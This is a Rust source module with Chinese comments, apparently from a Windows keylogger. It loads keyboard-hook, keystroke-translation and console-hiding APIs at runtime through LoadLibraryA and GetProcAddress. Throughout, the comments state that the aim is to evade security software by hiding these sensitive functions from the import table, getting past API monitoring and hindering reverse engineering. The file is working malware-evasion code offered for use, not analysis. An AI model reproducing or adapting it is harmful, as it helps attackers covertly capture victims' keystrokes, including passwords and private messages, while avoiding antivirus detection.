// ============================================================================
// Windows API 动态加载模块 - 函数指针调用绕过方法
// ============================================================================
// 本模块使用函数指针调用的方式来绕过安全软件的检测
//
// 【绕过原理】
// 传统方式：直接链接 Windows API 函数
//   - 编译时将函数调用硬编码到程序中
//   - 安全软件可以通过 IAT（导入地址表）轻松检测敏感函数调用
//   - 例如：直接调用 SetWindowsHookExA 会被安全软件标记
//
// 本程序方式：运行时动态获取函数地址
//   - 编译时不直接链接敏感函数，IAT 中没有这些函数
//   - 运行时通过 LoadLibraryA + GetProcAddress 获取函数地址
//   - 将函数地址存储在函数指针变量中，通过指针调用
//   - 安全软件难以静态分析出程序调用了哪些敏感函数
//
// 【工作流程】
// 1. LoadLibraryA("user32.dll") - 加载 DLL 到内存
// 2. GetProcAddress(hModule, "SetWindowsHookExA") - 获取函数地址
// 3. transmute 将地址转换为 Rust 可调用的函数指针
// 4. 通过函数指针调用：g_SetWindowsHookExA(Some(ptr))
//
// 【优点】
// - 绕过基于 IAT 的静态检测
// - 绕过简单的 API 调用监控
// - 程序更难被逆向分析
// ============================================================================

// ============================================================================
// Windows API 函数声明
// ============================================================================
// 这里只声明 LoadLibraryA 和 GetModuleHandleA
// 这两个函数是合法的，不会触发安全软件警报
// 其他敏感函数通过 GetProcAddress 动态获取

// 声明 kernel32.dll 中的函数
// kernel32.dll 是 Windows 系统核心库，包含：
// - 模块加载相关函数
// - 内存管理函数
// - 进程/线程管理函数
#[link(name = "kernel32")]
unsafe extern "system" {
    // 获取模块句柄
    // 参数: lpModuleName - 模块名称（null 表示当前模块）
    // 返回: 模块句柄，失败返回 0
    pub fn GetModuleHandleA(lpModuleName: *const i8) -> HINSTANCE;

    // 加载动态链接库
    // 参数: lpFileName - DLL 文件名
    // 返回: 模块句柄，失败返回 0
    pub fn LoadLibraryA(lpFileName: *const i8) -> HINSTANCE;
}

// ============================================================================
// 函数指针类型定义
// ============================================================================
// 定义 Windows API 函数的签名（参数和返回值类型）
// 这些类型用于将获取的函数地址转换为可调用的函数指针
//
// 【关键点】
// 使用函数指针类型而不是直接调用函数
// 这样编译器不会在 IAT 中生成导入条目

/// SetWindowsHookExA 函数类型
///
/// 用于安装系统钩子（敏感函数，通过指针调用绕过检测）
///
/// # 参数
/// 1. 钩子类型（如 WH_KEYBOARD_LL）
/// 2. 钩子回调函数
/// 3. 模块实例句柄
/// 4. 线程 ID（0 表示全局钩子）
///
/// # 返回
/// 钩子句柄，失败返回 0
type SetWindowsHookExAFn = unsafe extern "system" fn(
    i32,
    extern "system" fn(i32, WPARAM, LPARAM) -> LRESULT,
    HINSTANCE,
    DWORD,
) -> HHOOK;

/// CallNextHookEx 函数类型
///
/// 用于将消息传递给下一个钩子
///
/// # 参数
/// 1. 当前钩子句柄（可为 0）
/// 2. 钩子代码
/// 3. WPARAM 参数
/// 4. LPARAM 参数
///
/// # 返回
/// 下一个钩子的返回值
type CallNextHookExFn = unsafe extern "system" fn(HHOOK, i32, WPARAM, LPARAM) -> LRESULT;

/// UnhookWindowsHookEx 函数类型
///
/// 用于卸载钩子
///
/// # 参数
/// 钩子句柄
///
/// # 返回
/// 成功返回非零，失败返回 0
type UnhookWindowsHookExFn = unsafe extern "system" fn(HHOOK) -> BOOL;

/// GetMessageA 函数类型
///
/// 从消息队列获取消息
///
/// # 参数
/// 1. 消息结构体指针
/// 2. 窗口句柄
/// 3. 最小消息值
/// 4. 最大消息值
///
/// # 返回
/// -1: 错误
/// 0: WM_QUIT 消息
/// 其他: 正常消息
type GetMessageAFn = unsafe extern "system" fn(*mut MSG, HWND, u32, u32) -> BOOL;

/// ToAscii 函数类型
///
/// 将虚拟键码转换为 ASCII 字符
///
/// # 参数
/// 1. 虚拟键码
/// 2. 扫描码
/// 3. 键盘状态数组
/// 4. 输出缓冲区
/// 5. 标志位
///
/// # 返回
/// -1: 死字符
/// 0: 无法转换
/// 1-2: 转换的字符数
type ToAsciiFn = unsafe extern "system" fn(u32, u32, *const u8, *mut u16, u32) -> i32;

/// GetKeyboardState 函数类型
///
/// 获取当前键盘状态
///
/// # 参数
/// 256 字节的键盘状态数组指针
///
/// # 返回
/// 成功返回非零，失败返回 0
type GetKeyboardStateFn = unsafe extern "system" fn(*mut u8) -> BOOL;

/// ShowWindow 函数类型
///
/// 设置窗口的显示状态
///
/// # 参数
/// 1. 窗口句柄
/// 2. 显示命令（如 SW_HIDE=0, SW_SHOW=5）
///
/// # 返回
/// 窗口之前是否可见
type ShowWindowFn = unsafe extern "system" fn(HWND, i32) -> BOOL;

/// GetConsoleWindow 函数类型
///
/// 获取控制台窗口句柄
///
/// # 返回
/// 控制台窗口句柄
type GetConsoleWindowFn = unsafe extern "system" fn() -> HWND;

// ============================================================================
// 全局函数指针变量
// ============================================================================
// 存储动态加载的函数地址
//
// 【绕过关键】
// 这些变量在运行时被赋值，而不是编译时链接
// 安全软件扫描 IAT 时看不到这些敏感函数

/// SetWindowsHookExA 函数指针
/// 用于安装钩子（敏感函数，运行时获取地址）
#[allow(non_upper_case_globals)]
pub static mut g_SetWindowsHookExA: Option<SetWindowsHookExAFn> = None;

/// CallNextHookEx 函数指针
/// 用于调用下一个钩子
#[allow(non_upper_case_globals)]
pub static mut g_CallNextHookEx: Option<CallNextHookExFn> = None;

/// UnhookWindowsHookEx 函数指针
/// 用于卸载钩子
#[allow(non_upper_case_globals)]
pub static mut g_UnhookWindowsHookEx: Option<UnhookWindowsHookExFn> = None;

/// GetMessageA 函数指针
/// 用于获取消息
#[allow(non_upper_case_globals)]
pub static mut g_GetMessageA: Option<GetMessageAFn> = None;

/// ToAscii 函数指针
/// 用于将虚拟键码转换为字符
#[allow(non_upper_case_globals)]
pub static mut g_ToAscii: Option<ToAsciiFn> = None;

/// GetKeyboardState 函数指针
/// 用于获取键盘状态
#[allow(non_upper_case_globals)]
pub static mut g_GetKeyboardState: Option<GetKeyboardStateFn> = None;

/// ShowWindow 函数指针
/// 用于显示/隐藏窗口
#[allow(non_upper_case_globals)]
pub static mut g_ShowWindow: Option<ShowWindowFn> = None;

/// GetConsoleWindow 函数指针
/// 用于获取控制台窗口句柄
#[allow(non_upper_case_globals)]
pub static mut g_GetConsoleWindow: Option<GetConsoleWindowFn> = None;

/// 初始化函数指针 - 运行时动态获取敏感函数地址
///
/// 此函数是绕过检测的核心：
/// 1. 不在编译时链接敏感函数
/// 2. 运行时通过 GetProcAddress 获取函数地址
/// 3. 存储到全局函数指针变量中
///
/// # 参数
/// * `user32_module` - user32.dll 的模块句柄
///
/// # 安全性
/// 此函数使用 unsafe 块，因为：
/// - 操作全局可变静态变量
/// - 使用 transmute 进行类型转换（将 void* 转换为函数指针）
/// - 调用 Windows API
///
/// # 绕过原理
/// IAT（导入地址表）中只有 LoadLibraryA 和 GetProcAddress
/// 敏感函数 SetWindowsHookExA 等不在 IAT 中
/// 安全软件的静态扫描无法发现这些函数调用
pub unsafe fn init_function_pointers(user32_module: HINSTANCE) {
    // 检查模块句柄是否有效
    if user32_module == 0 {
        eprintln!("错误：无法加载 user32.dll");
        return;
    }

    // 将模块句柄转换为 void 指针
    // GetProcAddress 需要这种类型
    let user32_module_ptr = user32_module as *mut std::ffi::c_void;

    unsafe {
        // ====================================================================
        // 获取 SetWindowsHookExA 函数地址（敏感函数）
        // ====================================================================
        // 这是绕过检测的关键步骤：
        // - 不直接调用 SetWindowsHookExA
        // - 通过 GetProcAddress 获取地址
        // - transmute 将 void* 转换为函数指针
        // - 后续通过 g_SetWindowsHookExA 变量调用
        g_SetWindowsHookExA = Some(std::mem::transmute::<
            *mut std::ffi::c_void,
            SetWindowsHookExAFn,
        >(GetProcAddress(
            user32_module_ptr,
            "SetWindowsHookExA\0".as_ptr() as *const i8, // 函数名必须以 null 结尾
        )));

        // 获取 CallNextHookEx 函数地址
        g_CallNextHookEx = Some(
            std::mem::transmute::<*mut std::ffi::c_void, CallNextHookExFn>(GetProcAddress(
                user32_module_ptr,
                "CallNextHookEx\0".as_ptr() as *const i8,
            )),
        );

        // 获取 UnhookWindowsHookEx 函数地址
        g_UnhookWindowsHookEx = Some(std::mem::transmute::<
            *mut std::ffi::c_void,
            UnhookWindowsHookExFn,
        >(GetProcAddress(
            user32_module_ptr,
            "UnhookWindowsHookEx\0".as_ptr() as *const i8,
        )));

        // 获取 GetMessageA 函数地址
        g_GetMessageA = Some(std::mem::transmute::<*mut std::ffi::c_void, GetMessageAFn>(
            GetProcAddress(user32_module_ptr, "GetMessageA\0".as_ptr() as *const i8),
        ));

        // 获取 ToAscii 函数地址
        g_ToAscii = Some(std::mem::transmute::<*mut std::ffi::c_void, ToAsciiFn>(
            GetProcAddress(user32_module_ptr, "ToAscii\0".as_ptr() as *const i8),
        ));

        // 获取 GetKeyboardState 函数地址
        g_GetKeyboardState = Some(std::mem::transmute::<
            *mut std::ffi::c_void,
            GetKeyboardStateFn,
        >(GetProcAddress(
            user32_module_ptr,
            "GetKeyboardState\0".as_ptr() as *const i8,
        )));

        // 获取 ShowWindow 函数地址
        g_ShowWindow = Some(std::mem::transmute::<*mut std::ffi::c_void, ShowWindowFn>(
            GetProcAddress(user32_module_ptr, "ShowWindow\0".as_ptr() as *const i8),
        ));

        // 获取 GetConsoleWindow 函数地址
        // 这个函数在 kernel32.dll 中
        let kernel32_module = GetModuleHandleA("kernel32\0".as_ptr() as *const i8);
        g_GetConsoleWindow = Some(std::mem::transmute::<
            *mut std::ffi::c_void,
            GetConsoleWindowFn,
        >(GetProcAddress(
            kernel32_module as *mut std::ffi::c_void,
            "GetConsoleWindow\0".as_ptr() as *const i8,
        )));
    }
}

// ============================================================================
// GetProcAddress 函数声明
// ============================================================================
// GetProcAddress 是获取函数地址的核心函数
// 它允许我们在运行时获取任何 DLL 中的函数地址

// 声明 GetProcAddress 函数
// 参数:
//   hModule - 模块句柄（由 LoadLibraryA 或 GetModuleHandleA 返回）
//   lpProcName - 函数名（null 结尾的字符串）
// 返回: 函数地址，失败返回 null
#[link(name = "kernel32")]
unsafe extern "system" {
    fn GetProcAddress(
        hModule: *mut std::ffi::c_void,
        lpProcName: *const i8,
    ) -> *mut std::ffi::c_void;
}

// 导入 types 模块中的所有类型定义
pub use crate::types::*;
